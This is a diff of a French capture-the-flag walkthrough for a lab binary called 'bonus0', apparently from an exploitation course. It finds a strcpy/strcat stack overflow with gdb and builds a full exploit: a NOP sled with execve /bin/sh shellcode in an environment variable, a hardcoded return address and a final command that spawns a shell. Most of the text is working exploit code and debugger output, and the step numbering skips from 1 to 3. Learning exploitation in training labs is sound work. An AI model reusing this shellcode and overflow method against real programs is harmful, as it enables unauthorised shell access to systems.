@@ -1,23 +1,79 @@
-Etape 1:
-env -i payload=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') gdb bonus0
+### Bonus0
 
-Etape 2:
-(gdb) b main
-Breakpoint 1 at 0x80485a7
-(gdb) r
-Starting program: /home/user/bonus0/bonus0 
+Ce programme prend deux arguments sur l'entree standard.
+Ce qui est important c'est le buffer de 54 (param_1) qui est utilise dans la fonction pp. Apres avoir saisi nos deux entrees dans deux buffer de 20 chacun, le programme effectue un strcpy(param_1, firstEntry) et ensuite un strcat(param_1, secondEntry).
 
-Breakpoint 1, 0x080485a7 in main ()
+On verifie quel argument provoque l'overflow :
 
-(gdb) x/500s $esp
-//Trouver le payload dans la stack et recuperer une adresse en milieu de payload//
-[...]
-0xbffffe56:	 "\220\220\220\220...
-[...]
+    (gdb) r
+ 
+	- 
+	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+	- 
+	BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+	AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���
 
-Etape 3:
-Creation du bufferoverflow a partir des deux input pour remplacer EIP par l'adresse du payload
-python -c 'print "A"*4095 + "\n" + "B"*9 + "\x56\xfe\xff\xbf" + "\x90" * 64' > /tmp/exploit
+	Program received signal SIGSEGV, Segmentation fault.
+	0x42424242 in ?? ()
 
-Etape 4:
-cat /tmp/exploit - | env -i payload=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./bonus0
+Ici 0x42424242 fait reference a une chaine 'BBBB', donc il s'agit du deuxieme argument
+Maintenant on va verifier l'offset exact :
+
+	(gdb) r
+
+	- 
+	AAAA
+	- 
+	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+	AAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa���
+
+	[Inferior 1 (process 6253) exited normally]
+
+Ici on voit qu'il n'y a pas de segfault, il faut remplir le premier buffer de 20 :
+
+	(gdb) r
+	
+	- 
+	AAAAAAAAAAAAAAAAAAAAA
+	- 
+	Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+	AAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���
+
+	Program received signal SIGSEGV, Segmentation fault.
+	0x41336141 in ?? ()
+
+Register value EIP : 
+
+    0x41336141
+
+Offset :
+
+    9
+
+Vu la taille du buffer de 54, on ne peut pas integre le programme executant /bin/sh.
+On decide donc de creer une variable d'environnement specialement pour le programme qui contientra le payload ainsi que le shellcode.
+Il faut d'abord qu'on recupere une des adresses contenant les instructions '\x90', pour remplacer EIP par cette valeur afin d'executer un shell.
+On cree la variable avec la commande env et on la passe dans gdb :
+
+	env -i payload=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') gdb bonus0
+
+	(gdb) b main
+	Breakpoint 1 at 0x80485a7
+	(gdb) r
+
+	(gdb) x/500s $esp
+	//Trouver le payload dans la stack et recuperer une adresse en milieu de payload//
+	[...]
+	0xbffffe56:	 "\220\220\220\220...
+	[...]
+
+On cree le bufferoverflow a partir des deux input pour remplacer EIP par l'adresse du payload qu'on a selectione.
+Pour envoyer nos deux arguments en une ligne, il faut envoyer 4095 octets + le "\n" pour bypass le premier buffer :
+
+Etape 1 :
+
+	python -c 'print "A"*4095 + "\n" + "B"*9 + "\x56\xfe\xff\xbf" + "\x90" * 7' > /tmp/exploit
+
+Etape 3 :
+
+	cat /tmp/exploit - | env -i payload=$(python -c 'print "\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./bonus0
